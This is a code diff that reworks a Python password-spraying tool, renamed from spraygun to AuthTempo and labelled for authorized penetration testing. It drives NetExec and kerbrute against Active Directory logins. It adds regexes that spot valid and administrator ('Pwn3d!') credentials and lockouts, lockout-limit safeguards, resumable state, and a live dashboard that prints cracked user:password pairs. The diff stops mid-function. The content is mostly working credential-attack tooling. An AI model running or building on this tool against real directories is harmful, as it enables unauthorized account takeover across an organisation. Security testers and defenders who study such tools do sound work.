@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-spraygun.py — resilient password-spray orchestrator
+AuthTempo — safety-first password-spray orchestrator
 
 For authorized penetration testing only. Wraps nxc (NetExec) and kerbrute
 with preflight checks, failover between engines, lockout safety,
@@ -15,23 +15,34 @@ External tools (must be installed and on PATH, or override with --*-path):
 """
 
 import argparse
-import dataclasses
+import csv
 import datetime
 import enum
-import fcntl
+import hashlib
+import html
+import io
 import json
+import math
 import os
+import queue
 import re
+import shlex
 import shutil
 import signal
 import socket
 import subprocess
 import sys
+import tempfile
 import threading
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import List, Dict, Set, Optional, Tuple, Any
+
+try:
+    import fcntl
+except ImportError:  # pragma: no cover - AuthTempo currently targets Unix-like hosts.
+    fcntl = None
 
 # Rich library for live terminal UI
 try:
@@ -41,11 +52,19 @@ try:
     from rich.table import Table
     from rich.text import Text
     from rich.layout import Layout
+    from rich.markup import escape
     from rich.align import Align
     from rich import box
 except ImportError:
     print("[!] rich library not installed. Run: pip install rich", file=sys.stderr)
     sys.exit(1)
+
+PRODUCT_NAME = "AuthTempo"
+PRODUCT_SLUG = "authtempo"
+PRODUCT_TAGLINE = "controlled authentication testing with enforced safety limits"
+STATE_FILE_NAME = f"{PRODUCT_SLUG}.state.json"
+AUDIT_LOG_NAME = f"{PRODUCT_SLUG}.log"
+TIMELINE_HTML_NAME = f"{PRODUCT_SLUG}-timeline.html"
 
 # =============================================================================
 # Dataclasses
@@ -61,17 +80,20 @@ class Config:
     tool: str = "kerbrute"
     protocol: str = "ldap"
     time_between_rounds: int = 35
-    passwords_per_round: int = 2
+    passwords_per_round: int = 1
     pth_mode: bool = False
     lockout_threshold: int = 2
-    lockout_burst: int = 5
+    # Maximum lockout signals allowed in one secret/pass. The next signal is
+    # an unconditional hard stop. The legacy CLI name is --lockout-burst.
+    lockout_burst: int = 3
     conn_fail_limit: int = 10
     nxc_path: Optional[str] = None
     kerbrute_path: Optional[str] = None
     resume: bool = False
+    start_fresh: bool = False
     dry_run: bool = False
     no_preflight: bool = False
-    log_dir: str = "./spraygun-out"
+    log_dir: str = "./authtempo-out"
     filter_disabled: bool = False
     export: str = "none"
     schedule: str = ""
@@ -81,8 +103,16 @@ class Config:
     engine_transient_threshold: int = 2
     realm_retry: bool = True
     verbose: bool = False
+    live_ui: bool = True
+    force_live_ui: bool = False
+    retry_compromised: bool = False
+    retry_indeterminate: bool = False
+    engine_timeout_seconds: int = 300
+    engine_idle_timeout_seconds: int = 60
+    probe_demoted: bool = False
     # Derived fields
     users: List[str] = field(default_factory=list)
+    source_users: List[str] = field(default_factory=list)
     passwords: List[str] = field(default_factory=list)
     nxc_binary: str = ""
     kerbrute_binary: str = ""
@@ -105,11 +135,29 @@ class RoundResult:
     successes: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret)
     admin_users: List[Tuple[str, str]] = field(default_factory=list)  # (user, secret) - admin/pwn3d
     lockouts: Set[str] = field(default_factory=set)
+    unknown_lockouts: int = 0
     conn_fails: int = 0
     errors: List[str] = field(default_factory=list)  # Tool-level errors (wrong realm, etc.)
     aborted: bool = False
     abort_reason: str = ""
     clean_finish: bool = False
+    reconciled_complete: bool = False
+    terminal_users: Set[str] = field(default_factory=set)
+    indeterminate_users: Set[str] = field(default_factory=set)
+    ambiguous_lockouts: Set[str] = field(default_factory=set)
+    unknown_ambiguous_lockouts: int = 0
+    summary_tested: Optional[int] = None
+    dispatches: int = 0
+
+    @property
+    def lockout_count(self) -> int:
+        """Number of distinct known users plus unidentifiable lockout signals."""
+        return (
+            len(self.lockouts)
+            + self.unknown_lockouts
+            + len(self.ambiguous_lockouts)
+            + self.unknown_ambiguous_lockouts
+        )
 
 # =============================================================================
 # Classification pattern constants (version-agnostic, extensible)
@@ -119,9 +167,11 @@ class LineType(enum.Enum):
     SUCCESS = "SUCCESS"
     ADMIN = "ADMIN"  # Admin/high-privilege user (pwn3d!)
     LOCKOUT = "LOCKOUT"
+    AMBIGUOUS_LOCKOUT = "AMBIGUOUS_LOCKOUT"
     CONN_ERROR = "CONN_ERROR"
     AUTHFAIL = "AUTHFAIL"
     ERROR = "ERROR"  # Tool-level error (wrong realm, domain mismatch, etc.)
+    SUMMARY = "SUMMARY"
     INFO = "INFO"
 
 # nxc / netexec patterns
@@ -129,26 +179,29 @@ NXC_SUCCESS_PATTERNS = [r"\[\+\]"]  # netexec marks success with [+]
 
 # Admin/pwn3d patterns - check AFTER success since pwn3d appears on success lines
 NXC_ADMIN_PATTERNS = [
-    r"\(Pwn3d!\)",           # Explicit pwn3d marker
-    r"\[ADMIN\]",            # Admin status marker
-    r"\*.*\*",               # Some versions highlight admins with asterisks
-    r"Domain Admin",         # Explicit "Domain Admin" text
-    r"Administrator",        # Built-in admin account
-    r"admin.*privileged",    # Admin privilege indicators
+    r"\(Pwn3d!\)",
+    r"\[ADMIN\]",
 ]
 
 NXC_LOCKOUT_PATTERNS = [
+    r"USER_ACCOUNT_LOCKED",
     r"LOCKED_OUT",
     r"account locked out",
     r"STATUS_ACCOUNT_LOCKED_OUT",
+    r"\bdata\s+775\b",
+    r"\b0xC0000234\b",
     r"locked out",
+]
+NXC_AMBIGUOUS_LOCKOUT_PATTERNS = [
+    r"KDC_ERR_CLIENT_REVOKED",
 ]
 NXC_CONN_ERROR_PATTERNS = [
     r"timed out",
     r"NetBIOS",
-    r"connection",
+    r"connection (?:reset|aborted|closed|failed|error)",
     r"unreachable",
     r"Failed to connect",
+    r"Could not connect",
     r"SocketServer",
     r"Connection refused",
     r"Network unreachable",
@@ -158,10 +211,11 @@ NXC_AUTHFAIL_PATTERNS = [
     r"STATUS_LOGON_FAILURE",
     r"STATUS_NO_SUCH_USER",
     r"\[-\].*Status:",
+    r"\[-\].*\\[^:\s]+:\S+",
 ]
 
 # kerbrute patterns
-KERBRUTE_SUCCESS_PATTERNS = [r"\[\+\] VALID LOGIN:"]
+KERBRUTE_SUCCESS_PATTERNS = [r"\[\+\] VALID LOGIN(?: WITH ERROR)?:"]
 
 # kerbrute error patterns (detect domain/realm issues)
 KERBRUTE_ERROR_PATTERNS = [
@@ -176,11 +230,14 @@ KERBRUTE_ERROR_PATTERNS = [
 ]
 
 KERBRUTE_LOCKOUT_PATTERNS = [
-    r"locked",
-    r"KDC_ERR_CLIENT_REVOKED",
-    r"disabled",
+    r"account locked",
+    r"locked out",
 ]
+KERBRUTE_AMBIGUOUS_LOCKOUT_PATTERNS = [r"KDC_ERR_CLIENT_REVOKED"]
 KERBRUTE_CONN_ERROR_PATTERNS = [
+    r"NETWORK ERROR",
+    r"Can't talk to KDC",
+    r"cannot talk to KDC",
     r"i/o timeout",
     r"deadline exceeded",
     r"connection refused",
@@ -188,10 +245,105 @@ KERBRUTE_CONN_ERROR_PATTERNS = [
     r"network unreachable",
 ]
 KERBRUTE_AUTHFAIL_PATTERNS = [
+    r"KDC_ERR_PREAUTH_FAILED",
     r"KDC_ERR_PREAUTH_REQUIRED",
     r"KRB_AP_ERR_SKEW",
     r"KDC_ERR_C_PRINCIPAL_UNKNOWN",
 ]
+
+NXC_FATAL_ERROR_PATTERNS = [
+    r"Exception while calling proto_flow",
+    r"Traceback \(most recent call last\)",
+    r"Unhandled exception",
+]
+
+STATE_SCHEMA_VERSION = 6
+QUARANTINE_PRIORITY = {
+    "confirmed_lockout": 0,
+    "ambiguous_lockout_signal": 1,
+    "credential_found": 2,
+    "indeterminate": 3,
+    "unknown": 99,
+}
+TERMINAL_PAIR_STATUSES = {
+    "auth_failure",
+    "success",
+    "admin_success",
+    "lockout",
+    "ambiguous_lockout",
+    "indeterminate",
+    "dry_run",
+    "legacy_attempted",
+}
+NO_AUTH_ABORT_REASONS = {
+    "wrong-realm",
+    "binary-not-found",
+    "command-not-found",
+    "invalid-protocol",
+    "pth-kerbrute-incompatible",
+    "unknown-engine",
+}
+
+ANSI_ESCAPE_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")
+
+
+def canonical_identity(user: str, domain: str = "") -> str:
+    """Return a stable AD identity key while preserving the source value elsewhere."""
+    value = str(user).strip()
+    configured_domain = domain.casefold().rstrip(".")
+    configured_short = configured_domain.split(".", 1)[0] if configured_domain else ""
+
+    if "\\" in value:
+        prefix, short = value.rsplit("\\", 1)
+        if not configured_domain or prefix.casefold() in {configured_domain, configured_short}:
+            value = short
+    elif "@" in value:
+        short, realm = value.rsplit("@", 1)
+        realm_key = realm.casefold().rstrip(".")
+        if not configured_domain or realm_key in {configured_domain, configured_short}:
+            value = short
+
+    return value.casefold()
+
+
+def _identity_aliases(user: str, domain: str) -> Set[str]:
+    """Aliases that may be emitted for one configured-domain identity."""
+    aliases = {str(user).strip().casefold(), canonical_identity(user, domain)}
+    value = str(user).strip()
+    configured_domain = domain.casefold().rstrip(".")
+    configured_short = configured_domain.split(".", 1)[0] if configured_domain else ""
+    if "\\" in value:
+        qualifier, short = value.rsplit("\\", 1)
+        if not configured_domain or qualifier.casefold() in {configured_domain, configured_short}:
+            aliases.add(short.casefold())
+    if "@" in value:
+        short, qualifier = value.rsplit("@", 1)
+        if not configured_domain or qualifier.casefold().rstrip(".") in {
+            configured_domain,
+            configured_short,
+        }:
+            aliases.add(short.casefold())
+    return aliases
+
+
+def _sha256_json(value: Any) -> str:
+    payload = json.dumps(value, ensure_ascii=False, separators=(",", ":"), sort_keys=True)
+    return hashlib.sha256(payload.encode("utf-8")).hexdigest()
+
+
+def _reject_duplicate_json_keys(pairs: List[Tuple[str, Any]]) -> Dict[str, Any]:
+    """Build a JSON object while rejecting ambiguous duplicate keys."""
+    result: Dict[str, Any] = {}
+    for key, value in pairs:
+        if key in result:
+            raise ValueError(f"duplicate JSON object key: {key!r}")
+        result[key] = value
+    return result
+
+
+def _reject_nonfinite_json_constant(value: str) -> None:
+    """Reject Python's permissive NaN/Infinity JSON extensions."""
+    raise ValueError(f"non-finite JSON number is not allowed: {value}")
 
 # =============================================================================
 # Password pattern classification (for pattern learning)
@@ -248,52 +400,214 @@ def classify_password_pattern(pw: str) -> str:
 class RichUI:
     """Manages rich live UI: raw feed panel, summary panel, countdown."""
 
-    def __init__(self, console: Console, max_feed_lines: int = 50):
+    def __init__(
+        self,
+        console: Console,
+        max_feed_lines: int = 50,
+        live_ui: bool = True,
+        force_live: bool = False,
+    ):
         self.console = console
         self.live: Optional[Live] = None
         self.raw_feed: List[str] = []
         self.max_feed_lines = max_feed_lines
         self.current_phase = "idle"  # idle, spray, countdown, stopped
         self.phase_data: Dict[str, Any] = {}
+        self.current_round: Optional[int] = None
+
+        # These persist across engine failovers and password attempts. The old
+        # UI kept only the current child process's values, which made the round
+        # headline lose hits whenever another engine was tried.
+        self.round_successes: List[Tuple[str, str]] = []
+        self._round_success_set: Set[Tuple[str, str]] = set()
+        self.round_admins: Set[Tuple[str, str]] = set()
+        self.round_lockouts: Set[str] = set()
+        self.round_unknown_lockouts = 0
+        self.round_signal_events = 0
+        self.run_successes: List[Tuple[str, str]] = []
+        self._run_success_set: Set[Tuple[str, str]] = set()
+        self.run_admins: Set[Tuple[str, str]] = set()
+        self.run_lockouts: Set[str] = set()
+        self.run_unknown_lockouts = 0
+        self.run_signal_events = 0
+
+        # Redirected output and TERM=dumb cannot reliably support cursor-based
+        # Live rendering. In that case (or after a rendering exception), keep
+        # the spray running and stream the raw tool output instead.
+        term = os.environ.get("TERM", "")
+        self._tmux_auto_fallback = bool(
+            os.environ.get("TMUX") and live_ui and not force_live
+        )
+        self.live_enabled = bool(
+            live_ui
+            and console.is_terminal
+            and term != "dumb"
+            and not self._tmux_auto_fallback
+        )
+        self._stream_fallback = not self.live_enabled
+        self._live_warning_shown = False
+
+    def load_totals(
+        self,
+        credentials: List[Tuple[str, str]],
+        admin_credentials: Set[Tuple[str, str]],
+        locked_users: Set[str],
+        unknown_lockouts: int = 0,
+        signal_events: Optional[int] = None,
+    ) -> None:
+        """Seed run-wide UI totals from persisted state (including resumes)."""
+        self.run_successes = list(dict.fromkeys(credentials))
+        self._run_success_set = set(self.run_successes)
+        self.run_admins = set(admin_credentials)
+        self.run_lockouts = set(locked_users)
+        self.run_unknown_lockouts = unknown_lockouts
+        self.run_signal_events = (
+            signal_events
+            if signal_events is not None
+            else len(self.run_lockouts) + unknown_lockouts
+        )
 
     def start_spray(self, engine: Engine, secret: str, round_num: int, batch_info: str = ""):
         """Initialize the Live display for spray phase."""
+        # Defensive cleanup also prevents Rich's "only one live display" error
+        # after an engine exception or failover.
+        self.end_spray()
+
+        if self.current_round != round_num:
+            self.current_round = round_num
+            self.round_successes = []
+            self._round_success_set = set()
+            self.round_admins = set()
+            self.round_lockouts = set()
+            self.round_unknown_lockouts = 0
+            self.round_signal_events = 0
+
         self.current_phase = "spray"
         self.phase_data = {
             "engine": str(engine),
             "secret": secret,
             "batch_info": batch_info,
-            "round": round_num,
+            "batch": round_num,
             "successes": [],
-            "admin_users": [],  # Track admin/pwn3d users separately for highlighting
+            "success_set": set(),
+            "admin_users": set(),  # Track admin/pwn3d users separately for highlighting
             "lockouts": set(),
+            "unknown_lockouts": 0,
             "errors": [],  # Track tool errors
             "conn_fails": 0,
         }
         self.raw_feed = []
-        self.live = Live(self._render_spray(), console=self.console, refresh_per_second=10)
-        self.live.start()
+        if not self.live_enabled:
+            if self._tmux_auto_fallback and not self._live_warning_shown:
+                self._live_warning_shown = True
+                self.console.print(
+                    "[*] tmux detected: using stable streaming display. "
+                    "Use --live to force the cursor-based dashboard.",
+                    style="cyan",
+                )
+            self.console.print(
+                f"[*] Batch {round_num} | {engine} | "
+                f"credentials {len(self.run_successes)} | "
+                f"safety signals {self.run_signal_events}",
+                style="dim",
+            )
+            for found_user, found_secret in self.run_successes[-3:]:
+                marker = "ADMIN" if (found_user, found_secret) in self.run_admins else "CREDENTIAL"
+                self.console.print(
+                    f"[+] {marker}: {escape(str(found_user))}:"
+                    f"{escape(str(found_secret))}",
+                    style="red bold" if marker == "ADMIN" else "green bold",
+                )
+            return
+
+        if self.console.height < 12 or self.console.width < 60:
+            self.live_enabled = False
+            self._stream_fallback = True
+            if not self._live_warning_shown:
+                self._live_warning_shown = True
+                self.console.print(
+                    "[!] Terminal pane is too small for the Live dashboard; "
+                    "streaming raw output instead (minimum 60x12).",
+                    style="yellow",
+                )
+            return
+
+        try:
+            # A lower refresh rate is much less prone to flicker and partial
+            # frames inside tmux, especially over SSH.
+            refresh_rate = 4 if os.environ.get("TMUX") else 10
+            self.live = Live(
+                self._render_spray(),
+                console=self.console,
+                refresh_per_second=refresh_rate,
+                vertical_overflow="crop",
+                redirect_stdout=True,
+                redirect_stderr=True,
+            )
+            self.live.start(refresh=True)
+        except Exception as exc:
+            self._disable_live(exc)
 
     def feed_line(self, line: str):
         """Append a raw line to the feed (scrolling)."""
         if len(self.raw_feed) >= self.max_feed_lines:
             self.raw_feed.pop(0)
         self.raw_feed.append(line)
-        self._update_display()
+        if self.live:
+            self._update_display()
+        elif self._stream_fallback:
+            self.console.print(Text(line))
 
     def update_success(self, user: str, secret: str):
         """Register a credential hit."""
-        self.phase_data["successes"].append((user, secret))
+        is_new = (user, secret) not in self._run_success_set
+        self._record_success(user, secret, is_admin=False)
+        if self._stream_fallback and is_new:
+            self.console.print(
+                f"[+] CREDENTIAL: {escape(str(user))}:{escape(str(secret))}",
+                style="green bold",
+            )
         self._update_display()
 
     def update_admin(self, user: str, secret: str):
         """Register an admin credential hit (pwn3d!)."""
-        self.phase_data["admin_users"].append((user, secret))
+        is_new = (user, secret) not in self._run_success_set
+        self._record_success(user, secret, is_admin=True)
+        if self._stream_fallback and is_new:
+            self.console.print(
+                f"[+] ADMIN CREDENTIAL: {escape(str(user))}:{escape(str(secret))}",
+                style="red bold",
+            )
         self._update_display()
 
-    def update_lockout(self, user: str):
+    def _record_success(self, user: str, secret: str, is_admin: bool) -> None:
+        pair = (user, secret)
+        if pair not in self.phase_data["success_set"]:
+            self.phase_data["success_set"].add(pair)
+            self.phase_data["successes"].append(pair)
+        if pair not in self._round_success_set:
+            self._round_success_set.add(pair)
+            self.round_successes.append(pair)
+        if pair not in self._run_success_set:
+            self._run_success_set.add(pair)
+            self.run_successes.append(pair)
+        if is_admin:
+            self.phase_data["admin_users"].add(pair)
+            self.round_admins.add(pair)
+            self.run_admins.add(pair)
+
+    def update_lockout(self, user: Optional[str]):
         """Register a lockout."""
-        self.phase_data["lockouts"].add(user)
+        self.round_signal_events += 1
+        self.run_signal_events += 1
+        if user:
+            self.phase_data["lockouts"].add(user)
+            self.round_lockouts.add(user)
+            self.run_lockouts.add(user)
+        else:
+            self.phase_data["unknown_lockouts"] += 1
+            self.round_unknown_lockouts += 1
+            self.run_unknown_lockouts += 1
         self._update_display()
 
     def update_error(self, error_msg: str):
@@ -314,7 +628,38 @@ class RichUI:
     def _update_display(self):
         """Refresh the Live display."""
         if self.live and self.current_phase == "spray":
-            self.live.update(self._render_spray())
+            try:
+                self.live.update(self._render_spray(), refresh=True)
+            except Exception as exc:
+                self._disable_live(exc)
+
+    def _disable_live(self, exc: Exception) -> None:
+        """Degrade a terminal-rendering failure to safe line-by-line output."""
+        active_live = self.live
+        self.live = None
+        self.live_enabled = False
+        self._stream_fallback = True
+        if active_live:
+            try:
+                active_live.stop()
+            except Exception:
+                pass
+        if not self._live_warning_shown:
+            self._live_warning_shown = True
+            self.console.print(
+                f"[!] Live display unavailable ({escape(type(exc).__name__)}); "
+                "streaming raw output instead. Use --no-live to select this mode explicitly.",
+                style="yellow",
+            )
+
+    def _summary_height(self) -> int:
+        """Reserve enough pane space for both the summary and raw feed."""
+        terminal_height = max(int(getattr(self.console, "height", 24) or 24), 8)
+        detail_rows = min(3, len(self.run_successes)) + min(2, len(self.round_lockouts))
+        desired = 8 + detail_rows
+        # Fixed size=12 consumed the whole content area in a short tmux pane.
+        # Always leave at least seven terminal rows for the raw-feed panel.
+        return max(5, min(desired, terminal_height - 7))
 
     def _render_spray(self) -> Panel:
         """Render spray-phase panel."""
@@ -322,19 +667,16 @@ class RichUI:
         feed = self._build_feed()
         layout = Layout()
         layout.split_column(
-            Layout(summary, size=12),
+            Layout(summary, size=self._summary_height()),
             Layout(Panel(feed, title="Raw Feed", border_style="dim", box=box.SQUARE)),
         )
-        return Panel(layout, title=f"[bold]Spraygun — Round {self.phase_data.get('round', '?')}[/bold]", border_style="blue")
+        return Panel(layout, title=f"[bold]{PRODUCT_NAME} — Batch {self.phase_data.get('batch', '?')}[/bold]", border_style="blue")
 
     def _build_summary(self) -> Panel:
         """Build the summary panel."""
         engine = self.phase_data.get("engine", "N/A")
         secret = self.phase_data.get("secret", "***")
         batch_info = self.phase_data.get("batch_info", "")
-        successes = self.phase_data.get("successes", [])
-        admin_users = self.phase_data.get("admin_users", [])
-        lockouts = self.phase_data.get("lockouts", set())
         errors = self.phase_data.get("errors", [])
         conn_fails = self.phase_data.get("conn_fails", 0)
         abort_reason = self.phase_data.get("abort_reason", "")
@@ -343,41 +685,53 @@ class RichUI:
         grid.add_column()
         grid.add_column(justify="right")
 
-        # Show batch info if available
+        # Credentials stay at the top and persist across engine failovers. Show
+        # the actual pair so an operator never has to recover it from raw logs.
+        grid.add_row(
+            "[green bold]Credentials (batch / total):",
+            f"[green bold]{len(self.round_successes)} / {len(self.run_successes)}[/green bold]",
+        )
+        for user, found_secret in self.run_successes[-3:]:
+            pair = (user, found_secret)
+            if pair in self.run_admins:
+                marker = "[red bold]★ ADMIN[/red bold]"
+            else:
+                marker = "[green]✓[/green]"
+            grid.add_row(
+                "",
+                f"{marker} [white]{escape(str(user))}:{escape(str(found_secret))}[/white]",
+            )
+
+        grid.add_row(
+            "[yellow]Safety signals (batch / total):",
+            f"{self.round_signal_events} / {self.run_signal_events}",
+        )
+        grid.add_row(
+            "[yellow]Affected identities (batch / total):",
+            f"{len(self.round_lockouts)} / {len(self.run_lockouts)}",
+        )
+        for user in sorted(self.round_lockouts)[-2:]:
+            grid.add_row("", f"[yellow]![white] {escape(str(user))}")
+        if self.round_unknown_lockouts:
+            grid.add_row("", f"[yellow]! {self.round_unknown_lockouts} unknown user(s)[/yellow]")
+
+        grid.add_row("[cyan]Engine / current password:", f"{escape(str(engine))} / [yellow]{escape(str(secret))}[/yellow]")
+
+        # Batch detail is useful in normal terminals but deliberately comes
+        # after credentials and safety counters so short tmux panes crop it first.
         if batch_info:
-            grid.add_row("[cyan]Batch:", batch_info)
-
-        grid.add_row("[cyan]Engine:", engine)
-        grid.add_row("[cyan]Current password:", f"[yellow]{secret}[/yellow]")
-
-        # Show credentials found (green highlight)
-        grid.add_row("[green]Credentials found:", str(len(successes)))
-        if successes:
-            admin_set = {u for u, _ in admin_users}
-            regular_successes = [(u, s) for u, s in successes if u not in admin_set]
-            for user, _ in regular_successes[-5:]:  # Show last 5
-                grid.add_row("", f"  [green]✓[white] {user}")
-
-        # Show admin users with prominent styling
-        if admin_users:
-            grid.add_row("[red bold]ADMIN USERS [pwn3d!]:", str(len(admin_users)))
-            for user, _ in admin_users[-5:]:  # Show last 5
-                grid.add_row("", f"  [red bold]★[white] {user} [red](ADMIN)[/red]")
+            grid.add_row("[cyan]Batch:", escape(str(batch_info)))
 
         # Show errors
         if errors:
             grid.add_row("[red bold]ERRORS:", str(len(errors)))
             for err in errors[-3:]:  # Show last 3 errors
                 err_short = err[:60] + "..." if len(err) > 60 else err
-                grid.add_row("", f"  [red]✗[white] {err_short}")
+                grid.add_row("", f"  [red]✗[white] {escape(str(err_short))}")
 
-        grid.add_row("[yellow]Lockouts:", str(len(lockouts)))
-        if lockouts:
-            for user in list(lockouts)[-5:]:
-                grid.add_row("", f"  [yellow]![white] {user}")
         grid.add_row("[red]Connection failures:", str(conn_fails))
         if abort_reason:
-            grid.add_row("[red]Aborted:", abort_reason)
+            grid.add_row("[red]Aborted:", escape(str(abort_reason)))
 
         return Panel(grid, title="Summary", border_style="cyan")
 
@@ -385,34 +739,57 @@ class RichUI:
         """Build the raw feed text."""
         if not self.raw_feed:
             return "[dim]Waiting for tool output...[/dim]"
-        # Last N lines with recent ones at top (reverse for display)
-        lines_rev = self.raw_feed[::-1]
+        # Keep recent lines at the top. Limit content to the actual pane height
+        # so Rich doesn't spend time rendering lines that tmux will crop.
+        available_rows = max(1, int(getattr(self.console, "height", 24)) - self._summary_height() - 5)
+        lines_rev = self.raw_feed[-min(self.max_feed_lines, available_rows):][::-1]
         # Colorize: red/bold for pwn3d/admin, green for [+] success, yellow for lockout keywords, red for error keywords
         colored = []
         for line in lines_rev:
+            safe_line = escape(line)
             # Check for admin/pwn3d indicators first (highest priority)
             if any(kw in line for kw in ["(Pwn3d!)", "[ADMIN]", "Domain Admin", "Administrator"]):
-                colored.append(f"[red bold]{line}[/red bold]")
+                colored.append(f"[red bold]{safe_line}[/red bold]")
             elif "[+]" in line or "VALID LOGIN" in line:
-                colored.append(f"[green]{line}[/green]")
+                colored.append(f"[green]{safe_line}[/green]")
             elif any(kw in line.upper() for kw in ["LOCKED", "LOCKOUT", "REVOKED"]):
-                colored.append(f"[yellow]{line}[/yellow]")
+                colored.append(f"[yellow]{safe_line}[/yellow]")
             elif any(kw in line for kw in ["timed out", "NetBIOS", "connection", "unreachable"]):
-                colored.append(f"[red]{line}[/red]")
+                colored.append(f"[red]{safe_line}[/red]")
             else:
-                colored.append(f"[dim]{line}[/dim]")
+                colored.append(f"[dim]{safe_line}[/dim]")
         return "\n".join(colored)
 
     def end_spray(self):
         """Stop the Live display after spray phase."""
-        if self.live:
-            self.live.stop()
-            self.live = None
+        active_live = self.live
+        self.live = None
+        if active_live:
+            try:
+                active_live.stop()
+            except Exception as exc:
+                self._disable_live(exc)
         self.current_phase = "idle"
 
     def countdown(self, seconds: int):
-        """Show MM:SS countdown between rounds - simple line by line."""
+        """Show MM:SS countdown between batches - simple line by line."""
         mins, secs = divmod(seconds, 60)
+        if self._stream_fallback:
+            self.console.print(
+                f"[*] Time until next spray: {mins:02d}:{secs:02d}",
+                style="cyan",
+            )
+            while seconds > 0:
+                time.sleep(1)
+                seconds -= 1
+                if seconds and (seconds % 60 == 0 or seconds <= 10):
+                    mins, secs = divmod(seconds, 60)
+                    self.console.print(
+                        f"[*] Time until next spray: {mins:02d}:{secs:02d}",
+                        style="dim",
+                    )
+            return
+
         self.console.print(f"[*] Time until next spray: {mins:02d}:{secs:02d}", style="cyan", end="")
 
         while seconds > 0:
@@ -436,7 +813,7 @@ class RichUI:
             Layout(self._build_summary()),
             Layout(Align.center(Text(f"  Time until next spray: {countdown_str}  ")))
         )
-        return Panel(layout, title="[bold]Spraygun — Waiting[/bold]", border_style="blue")
+        return Panel(layout, title=f"[bold]{PRODUCT_NAME} — Waiting[/bold]", border_style="blue")
 
     def alert(self, title: str, message: str, style: str = "yellow"):
         """Show a non-modal alert (use for hard-stops, preflight failures)."""
@@ -451,12 +828,33 @@ class State:
     """Load/save run state for resumability."""
 
     def __init__(self, log_dir: str, cfg: Config):
+        if not cfg.source_users:
+            cfg.source_users = list(cfg.users)
+        for user in cfg.users:
+            if not user or any(ord(char) < 32 for char in user):
+                raise ValueError("configured identities cannot be empty or contain control characters")
+        for secret in cfg.passwords:
+            if secret == "" or any(
+                ord(char) < 32 and char != "\t"
+                for char in secret
+            ):
+                raise ValueError(
+                    "configured secrets cannot be empty or contain line/control characters"
+                )
+        if len({canonical_identity(user, cfg.domain) for user in cfg.users}) != len(cfg.users):
+            raise ValueError("configured identities contain canonical duplicates")
+        if len(set(cfg.passwords)) != len(cfg.passwords):
+            raise ValueError("configured secrets contain exact duplicates")
         self.log_dir = Path(log_dir)
-        self.log_dir.mkdir(parents=True, exist_ok=True)
+        self.log_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
+        os.chmod(self.log_dir, 0o700)
         self.cfg = cfg
 
-        self.state_file = self.log_dir / "spraygun.state.json"
-        self.overall_log = self.log_dir / "spraygun-spray.log"
+        self._lock_handle = None
+        self._acquire_run_lock()
+
+        self.state_file = self.log_dir / STATE_FILE_NAME
+        self.overall_log = self.log_dir / AUDIT_LOG_NAME
         self.creds_file = self.log_dir / "creds.txt"
         self.lockouts_file = self.log_dir / "locked-out.txt"
         self.used_file = self.log_dir / "used-passwords.txt"
@@ -464,12 +862,25 @@ class State:
         # Runtime state
         self.used_passwords: List[str] = []
         self.remaining_queue: List[str] = []
+        # `found_creds` remains for state-file compatibility. `credentials`
+        # is the authoritative pair-level history so two working passwords for
+        # one user are not collapsed into a single success.
         self.found_creds: Dict[str, str] = {}
+        self.credentials: List[Dict[str, Any]] = []
+        self._credential_index: Dict[Tuple[str, str], Dict[str, Any]] = {}
         self.locked_users: Set[str] = set()
+        self.quarantined_users: Dict[str, Dict[str, Any]] = {}
+        self.lockout_signals: List[Dict[str, Any]] = []
+        self.unknown_lockout_events: int = 0
+        self.acknowledged_lockouts: int = 0
         self.completed_rounds = 0
+        self.last_batch_completed_at: Optional[str] = None
+        self.current_round: int = 0
+        self.current_pass: int = 0
 
         # Feature 1: Credential-reuse matrix (password -> set of users attempted)
         self.attempted_matrix: Dict[str, Set[str]] = {}
+        self.pair_ledger: Dict[str, Dict[str, Dict[str, Any]]] = {}
 
         # Feature 3: Pattern learning (pattern -> success count)
         self.success_by_pattern: Dict[str, int] = {}
@@ -480,10 +891,12 @@ class State:
         # Feature 4: Spray statistics
         self.start_time: str = datetime.datetime.now().isoformat()
         self.total_attempts: int = 0
+        self.total_dispatches: int = 0
         self.attempts_by_password: Dict[str, int] = {}
 
         # Temp file counter for userlist filtering
         self._tmp_userlist_idx: int = 0
+        self.active_process: Optional[subprocess.Popen] = None
 
         # Feature D: Automatic throttling on response stress
         self.conn_fail_history: List[int] = []
@@ -496,96 +909,910 @@ class State:
         self.engine_health: Dict[str, Dict] = {}
         self.known_bad_realms: List[str] = []
         self.working_realm: Optional[str] = None
+        self.identity_filter_complete: bool = not (
+            cfg.filter_disabled and not cfg.dry_run
+        )
 
         # Stash cooldown/threshold config values for easy access
         self.cooldown_rounds = cfg.engine_cooldown_rounds
         self.transient_threshold = cfg.engine_transient_threshold
 
-        if cfg.resume:
-            self._load()
-        else:
-            self._init_queue()
+        self._configured_by_key: Dict[str, str] = {}
+        self._configured_by_alias: Dict[str, str] = {}
+        self._rebuild_configured_identity_maps()
+
+        try:
+            if cfg.resume:
+                self._load()
+            else:
+                self._prepare_fresh_directory()
+                self._init_queue()
+            self._remove_unrequested_artifacts()
+        except Exception:
+            self.close()
+            raise
+
+    def _rebuild_configured_identity_maps(self) -> None:
+        self._configured_by_key.clear()
+        self._configured_by_alias.clear()
+        for configured_user in self.cfg.users:
+            key = canonical_identity(configured_user, self.cfg.domain)
+            self._configured_by_key.setdefault(key, configured_user)
+            for alias in _identity_aliases(configured_user, self.cfg.domain):
+                self._configured_by_alias.setdefault(alias, configured_user)
+
+    def set_effective_users(self, users: List[str]) -> None:
+        """Replace a fresh run's source list with its enumerated identity set."""
+        if self.cfg.resume or self.pair_ledger:
+            raise RuntimeError("effective users can only be set before a fresh run dispatches")
+        if not users:
+            raise RuntimeError("effective user set cannot be empty")
+        self.cfg.users = list(users)
+        self._rebuild_configured_identity_maps()
+        self.identity_filter_complete = True
+        self.save()
+
+    def _acquire_run_lock(self) -> None:
+        """Hold an exclusive lock for the lifetime of this State instance."""
+        lock_path = self.log_dir / ".run.lock"
+        fd = os.open(lock_path, os.O_RDWR | os.O_CREAT, 0o600)
+        os.fchmod(fd, 0o600)
+        handle = os.fdopen(fd, "a+", encoding="utf-8")
+        if fcntl is None:
+            handle.close()
+            raise RuntimeError(
+                "this platform cannot provide the required exclusive run-directory lock"
+            )
+        try:
